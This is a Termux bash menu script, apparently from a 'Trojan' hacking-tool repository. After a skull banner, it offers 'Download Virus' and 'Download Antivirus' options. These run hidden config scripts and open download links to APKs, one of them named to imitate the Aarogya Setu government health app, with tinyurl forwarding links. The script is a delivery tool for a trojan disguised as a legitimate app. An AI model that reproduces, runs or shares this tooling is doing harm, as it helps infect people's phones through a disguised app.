#!/data/data/com.termux/files/usr/bin/bash

clear
command -v ruby > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed, Now Installing."; apt install ruby -y; }
command -v lolcat > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed, Now Installing."; gem install lolcat; }
echo '
                                   █████████████████████
                                ████▀─────────────────▀████
                              ███▀───────────────────────▀███
                             ██▀───────────────────────────▀██
                            █▀───────────────────────────────▀█
                            █─────────────────────────────────█
                            █─────────────────────────────────█
                            █─────────────────────────────────█
                            █───█████─────────────────█████───█
                            █──██▓▓▓███─────────────███▓▓▓██──█
                            █──██▓▓▓▓▓██───────────██▓▓▓▓▓██──█
                            █──██▓▓▓▓▓▓██─────────██▓▓▓▓▓▓██──█
                            █▄──████▓▓▓▓██───────██▓▓▓▓████──▄█
                            ▀█▄───▀███▓▓▓██─────██▓▓▓███▀───▄█▀
                              █▄────▀█████▀─────▀█████▀────▄█
                             ▄██───────────▄█─█▄───────────██▄
                             ███───────────██─██───────────███
                             ███───────────────────────────███
                             ▀██──██▀██──█──█──█──██▀██──██▀
                              ▀████▀ ██──█──█──█──██─▀████▀
                               ▀██▀  ██──█──█──█──██──▀██▀
                                     ██──█──█──█──██
                                     ██──█──█──█──██
                                     ██──█──█──█──██
                                     ██──█──█──█──██
                                     ██──█──█──█──██
                                     ██──█──█──█──██
                                     ██──█──█──█──██
                                     ██──█──█──█──██
                                      █▄▄█▄▄█▄▄█▄▄█ ' | lolcat -a -t -d 1 -s 500
          

echo
echo -e '\033[1m[1] Download Virus
[2] Download Antivirus
[3] Update
[4] Exit' | lolcat -s 100 -t -a -d 1
printf $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m'
        read char
        if [[ $char = "1" ]] || [[ $char = "01" ]]
        then cd .files && bash config.sh
echo
sleep 0.8
echo -e '\033[1;92mForwarding link: \033[0mhttps://tinyurl.com/y7ufkdfs'
sleep 0.2
echo
printf '\033[1m[?] Are you want to Download with External Sources ? [Y/n] ' | lolcat -a -d 1 -s 100 -t
read ask
if  [[ $ask = "y" ]] || [[ $ask = "Y" ]]
        then echo
sleep 0.8
echo -e '\033[1m[!] You will redirect to site...' | lolcat -a -t -d 1 -s 100
xdg-open 'https://github.com/abhackerofficial/Trojan/blob/master/.files/gov.aarogya_setu_1.1.1.apk?raw=true'
else cd .. && bash trojan.sh
fi
echo
sleep 1.0
exit

        elif [[ $char = "2" ]] || [[ $char = "02" ]]
        then cd .files && bash config+.sh
echo
sleep 0.8
echo -e '\033[0;92mForwarding link: \033[0mhttps://tinyurl.com/y8rm36ux'
sleep 0.2
echo
printf '\033[1m[?] Are you want to Download with External Sources ? [Y/n] ' | lolcat -a -d 1 -s 100 -t
read ask
if  [[ $ask = "y" ]] || [[ $ask = "Y" ]]
        then echo
sleep 0.8
echo -e '\033[1m[!] You will redirect to site...' | lolcat -a -t -d 1 -s 
xdg-open 'https://github.com/abhackerofficial/Trojan/blob/master/.files/saver_1.0.apk?raw=true'
else cd .. && bash trojan.sh
fi
echo
sleep 1
exit

        elif [[ $char = "3" ]] || [[ $char = "03" ]]
        then
echo
echo -e '\033[1mUpdating Please wait...' | lolcat -a -d 1 -t -s 100
echo
cd .files && bash update.sh

        elif [[ $char = "4" ]] || [[ $char = "04" ]]
        then
clear
exit
        else
echo
        printf "\e[1;93m[!] Invalid option!\e[0m\n"
echo
    fi
